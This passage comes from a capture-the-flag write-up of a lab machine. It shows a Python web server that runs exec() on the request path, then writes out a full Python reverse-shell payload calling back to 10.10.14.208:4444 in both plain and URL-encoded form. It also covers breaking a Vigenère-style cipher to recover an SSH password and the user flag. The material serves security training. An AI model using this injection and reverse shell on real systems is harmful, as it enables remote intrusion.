<span class="code-line">        <span class="n">modified</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span></span>
<span class="code-line">        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">contentType</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s2">&quot;mime&quot;</span><span class="p">]</span> <span class="c1"># Try and identify MIME type from string</span></span>
<span class="code-line">        <span class="n">connectionType</span> <span class="o">=</span> <span class="s2">&quot;Closed&quot;</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">        <span class="n">resp</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span></span>
<span class="code-line">        <span class="n">statusNum</span><span class="o">=</span><span class="n">statusNum</span><span class="p">,</span> <span class="n">statusCode</span><span class="o">=</span><span class="n">statusCode</span><span class="p">,</span></span>
<span class="code-line">        <span class="n">dateSent</span> <span class="o">=</span> <span class="n">dateSent</span><span class="p">,</span> <span class="n">server</span> <span class="o">=</span> <span class="n">server</span><span class="p">,</span></span>
<span class="code-line">        <span class="n">modified</span> <span class="o">=</span> <span class="n">modified</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">,</span></span>
<span class="code-line">        <span class="n">contentType</span> <span class="o">=</span> <span class="n">contentType</span><span class="p">,</span> <span class="n">connectionType</span> <span class="o">=</span> <span class="n">connectionType</span><span class="p">,</span></span>
<span class="code-line">        <span class="n">body</span> <span class="o">=</span> <span class="n">body</span></span>
<span class="code-line">        <span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">stringResponse</span><span class="p">()</span></span>
<span class="code-line">        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span></span>
<span class="code-line">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span></span>
<span class="code-line">        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span></span>
<span class="code-line">        <span class="k">return</span> <span class="mi">0</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span></span>
<span class="code-line">        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span></span>
<span class="code-line">        <span class="k">try</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">info</span> <span class="o">=</span> <span class="s2">&quot;output = &#39;Document: </span><span class="si">{}</span><span class="s2">&#39;&quot;</span> <span class="c1"># Keep the output for later debug</span></span>
<span class="code-line">            <span class="n">exec</span><span class="p">(</span><span class="n">info</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?</span></span>
<span class="code-line">            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span></span>
<span class="code-line">            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span></span>
<span class="code-line">            <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s2">&quot;/&quot;</span><span class="p">:</span></span>
<span class="code-line">                <span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;/index.html&quot;</span></span>
<span class="code-line">            <span class="n">requested</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span></span>
<span class="code-line">            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">requested</span><span class="p">):</span></span>
<span class="code-line">                <span class="n">mime</span> <span class="o">=</span> <span class="n">mimetypes</span><span class="o">.</span><span class="n">guess_type</span><span class="p">(</span><span class="n">requested</span><span class="p">)</span></span>
<span class="code-line">                <span class="n">mime</span> <span class="o">=</span> <span class="p">(</span><span class="n">mime</span> <span class="k">if</span> <span class="n">mime</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="kc">None</span> <span class="k">else</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span></span>
<span class="code-line">                <span class="n">mime</span> <span class="o">=</span> <span class="n">MIMES</span><span class="p">[</span><span class="n">requested</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span></span>
<span class="code-line">                <span class="k">try</span><span class="p">:</span></span>
<span class="code-line">                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line">                <span class="k">except</span><span class="p">:</span></span>
<span class="code-line">                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line">                <span class="n">status</span> <span class="o">=</span> <span class="s2">&quot;200&quot;</span></span>
<span class="code-line">            <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">                <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s2">&quot;errors&quot;</span><span class="p">,</span> <span class="s2">&quot;404.html&quot;</span><span class="p">)</span></span>
<span class="code-line">                <span class="n">mime</span> <span class="o">=</span> <span class="s2">&quot;text/html&quot;</span></span>
<span class="code-line">                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">                    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span></span>
<span class="code-line">                <span class="n">status</span> <span class="o">=</span> <span class="s2">&quot;404&quot;</span></span>
<span class="code-line">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span></span>
<span class="code-line">            <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span></span>
<span class="code-line">            <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s2">&quot;errors&quot;</span><span class="p">,</span> <span class="s2">&quot;500.html&quot;</span><span class="p">)</span></span>
<span class="code-line">            <span class="n">mime</span> <span class="o">=</span> <span class="s2">&quot;text/html&quot;</span></span>
<span class="code-line">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">                <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line">            <span class="n">status</span> <span class="o">=</span> <span class="s2">&quot;500&quot;</span></span>
<span class="code-line">        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span> <span class="s2">&quot;mime&quot;</span><span class="p">:</span> <span class="n">mime</span><span class="p">,</span> <span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="n">status</span><span class="p">}</span></span>
<span class="code-line"></code></pre></div>

<p>The script is a bit long but we can see the line
<code>exec(info.format(path))</code> where <code>path</code> is the user input (the path in a GET
request). The use of the <code>exec()</code> function is dangerous as
<code>exec(os.system(&lt;cmd&gt;))</code> will execute the command on the system (if <code>os</code> is
imported).</p>
<p>Here there is some python before the <code>exec()</code>:
<code>info = "output = 'Document: {}'"</code> so we need to "escape" this string. We try a
few thing on our system:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; path = &#39;&#39;</span>
<span class="code-line">&gt;&gt;&gt; exec(info.format(path))</span>
<span class="code-line">&gt;&gt;&gt; path = &quot;test&#39;; print(&#39;boom&#39;); &#39;test&quot;</span>
<span class="code-line">&gt;&gt;&gt; exec(info.format(path))</span>
<span class="code-line">boom</span>
<span class="code-line"></code></pre></div>

<p>So we can insert some payload between the two <code>;</code>. As the server is running
python we will use the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">python TCP reverse
shell</a></p>
<p>So our payload is: <code>test'; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.208",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");'test</code>.</p>
<p>We get a error 400 "Bad request", so we encode our payload with Burp (url encode
all characters). The payload look like the following in burp repeater (yes I
also encoded the first <code>/</code> which is not part of our payload):</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET %2f%74%65%73%74%27%3b%20%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%30%2e%31%30%2e%31%34%2e%32%30%38%22%2c%34%34%34%34%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%69%6d%70%6f%72%74%20%70%74%79%3b%20%70%74%79%2e%73%70%61%77%6e%28%22%2f%62%69%6e%2f%62%61%73%68%22%29%3b%27%74%65%73%74 HTTP/1.1</span>
<span class="code-line"></span>
<span class="code-line">Host: 10.10.10.168:8080</span>
<span class="code-line"></code></pre></div>

<p>This give us a reverse shell as <code>www-data</code>. We start enumerating the box and
found interesting files in the <code>robert</code> home folder.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>www-data@obscure:/$ id</span>
<span class="code-line">id</span>
<span class="code-line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
<span class="code-line">www-data@obscure:/$ ls /home/</span>
<span class="code-line">ls /home/</span>
<span class="code-line">robert</span>
<span class="code-line">www-data@obscure:/$ ls /home/robert/</span>
<span class="code-line">ls /home/robert/</span>
<span class="code-line">BetterSSH  enum     passwordreminder.txt  user.txt</span>
<span class="code-line">check.txt  out.txt  SuperSecureCrypt.py</span>
<span class="code-line">www-data@obscure:/$ ls /home/robert/BetterSSH/</span>
<span class="code-line">ls /home/robert/BetterSSH/</span>
<span class="code-line">BetterSSH.py</span>
<span class="code-line"></code></pre></div>

<p>We get the SuperSecureCrypt.py file (<em>I also get the BetterSSH.py file but it
will be used later</em>).</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">sys</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">argparse</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span></span>
<span class="code-line">    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span></span>
<span class="code-line">    <span class="n">encrypted</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span></span>
<span class="code-line">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span></span>
<span class="code-line">        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span></span>
<span class="code-line">        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span></span>
<span class="code-line">        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span></span>
<span class="code-line">    <span class="k">return</span> <span class="n">encrypted</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span></span>
<span class="code-line">    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span></span>
<span class="code-line">    <span class="n">decrypted</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span></span>
<span class="code-line">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span></span>
<span class="code-line">        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span></span>
<span class="code-line">        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span></span>
<span class="code-line">        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span></span>
<span class="code-line">    <span class="k">return</span> <span class="n">decrypted</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Encrypt with 0bscura</span><span class="se">\&#39;</span><span class="s1">s encryption algorithm&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;InFile&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">help</span><span class="o">=</span><span class="s1">&#39;The file to read&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;OutFile&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Where to output the encrypted/decrypted file&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-k&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;Key&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Key to use&#39;</span><span class="p">,</span></span>
<span class="code-line">                    <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Decrypt mode&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">banner</span> <span class="o">=</span> <span class="s2">&quot;################################</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line"><span class="n">banner</span><span class="o">+=</span> <span class="s2">&quot;#           BEGINNING          #</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line"><span class="n">banner</span><span class="o">+=</span> <span class="s2">&quot;#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line"><span class="n">banner</span><span class="o">+=</span> <span class="s2">&quot;################################</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line"><span class="n">banner</span> <span class="o">+=</span> <span class="s2">&quot;  ############################</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line"><span class="n">banner</span> <span class="o">+=</span> <span class="s2">&quot;  #        FILE MODE         #</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line"><span class="n">banner</span> <span class="o">+=</span> <span class="s2">&quot;  ############################&quot;</span></span>
<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span></span>
<span class="code-line"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">o</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">i</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span></span>
<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Missing args&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="k">else</span><span class="p">:</span></span>
<span class="code-line">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">d</span><span class="p">:</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Opening file </span><span class="si">{0}</span><span class="s2">...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">))</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Decrypting...&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Writing to </span><span class="si">{0}</span><span class="s2">...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">))</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span></span>
<span class="code-line">    <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Opening file </span><span class="si">{0}</span><span class="s2">...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">))</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Encrypting...&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Writing to </span><span class="si">{0}</span><span class="s2">...&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">))</span></span>
<span class="code-line">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span></span>
<span class="code-line"></code></pre></div>

<p>We also get the out.txt, passwordreminder.txt and check.txt files. As the first
two contains non printable characters we encode them in base64.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>www-data@obscure:/$ base64 /home/robert/out.txt</span>
<span class="code-line">base64 /home/robert/out.txt</span>
<span class="code-line">wqbDmsOIw6rDmsOew5jDm8Odw53CicOXw5DDisOfwoXDnsOKw5rDicKSw6bDn8Odw4vCiMOaw5vD</span>
<span class="code-line">msOqwoHDmcOJw6vCj8Opw5HDksOdw43DkMKFw6rDhsOhw5nDnsOjwpbDksORwojDkMOhw5nCpsOV</span>
<span class="code-line">w6bDmMKewo/Do8OKw47DjcKBw5/DmsOqw4bCjsOdw6HDpMOowonDjsONw5rCjMOOw6vCgcORw5PD</span>
<span class="code-line">pMOhw5vDjMOXwonCgXY=</span>
<span class="code-line">www-data@obscure:/$ base64 /home/robert/passwordreminder.txt</span>
<span class="code-line">base64 /home/robert/passwordreminder.txt</span>
<span class="code-line">wrTDkcOIw4zDicOgw5nDgcORw6nCr8K3wr9r</span>
<span class="code-line">www-data@obscure:/$ cat /home/robert/check.txt</span>
<span class="code-line">Encrypting this file with your key should result in out.txt, make sure your key is correct!</span>
<span class="code-line"></code></pre></div>

<p>The script is a simple implementation of the
<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenère cipher</a>. As we got
a clear text (<code>check.txt</code>) and a cipher text (<code>out.txt</code>) we can easily get the
key by using a simple python3 script.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">clair</span>   <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;./check.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line"><span class="n">chiffre</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;./out.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">i</span><span class="o">=</span><span class="mi">0</span></span>
<span class="code-line"><span class="n">key</span><span class="o">=</span><span class="s1">&#39;&#39;</span></span>
<span class="code-line"><span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">clair</span><span class="p">):</span></span>
<span class="code-line">    <span class="n">key</span><span class="o">+=</span><span class="p">(</span><span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">chiffre</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">clair</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span><span class="o">%</span><span class="mi">255</span><span class="p">))</span></span>
<span class="code-line">    <span class="n">i</span><span class="o">+=</span><span class="mi">1</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span></span>
<span class="code-line"></code></pre></div>

<p>Using this script we get the key using to cipher them: <code>alexandrovich</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python3 decrypt.py</span>
<span class="code-line">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</span>
<span class="code-line"></code></pre></div>

<p><strong>Note: Do not do you own crypto!</strong> Also, if we didn't had the <code>check.txt</code> and
<code>out.txt</code> files the cracking will have been harder. As this was a Vigenère
cipher we could have brute force the key or tried so <a href="https://pages.mtu.edu/~shene/NSF-4/Tutorial/VIG/Vig-Frequency-Analysis.html">frequency
analysis</a>
but the <code>passwordreminder.txt</code> file is a bit short for this kind of attack.</p>
<p>Then we use the <code>SuperSecureCrypt.py</code> script to decode the password file with
the key and get the password <code>SecThruObsFTW</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o pass &amp;&amp; cat pass</span>
<span class="code-line">################################</span>
<span class="code-line">#           BEGINNING          #</span>
<span class="code-line">#    SUPER SECURE ENCRYPTOR    #</span>
<span class="code-line">################################</span>
<span class="code-line">  ############################</span>
<span class="code-line">  #        FILE MODE         #</span>
<span class="code-line">  ############################</span>
<span class="code-line">Opening file pas...</span>
<span class="code-line">Decrypting...</span>
<span class="code-line">Writing to pass...</span>
<span class="code-line">SecThruObsFTW</span>
<span class="code-line"></code></pre></div>

<p>We can then connect using SSH as robert and get the user flag.
    :::text
    ssh robert@10.10.10.168
    robert@10.10.10.168's password:
    robert@obscure:~$ cat user.txt
    e4493782066b55fe2755708736ada2d7</p>
<h1 id="getting-root">Getting root</h1>
<p>As robert with our SSH shell we start enumerating the box. We have some
interesting <code>sudo</code> permissions.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>robert@obscure:~$ sudo -l</span>
<span class="code-line"></span>
<span class="code-line">User robert may run the following commands on obscure:</span>
<span class="code-line">    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span>
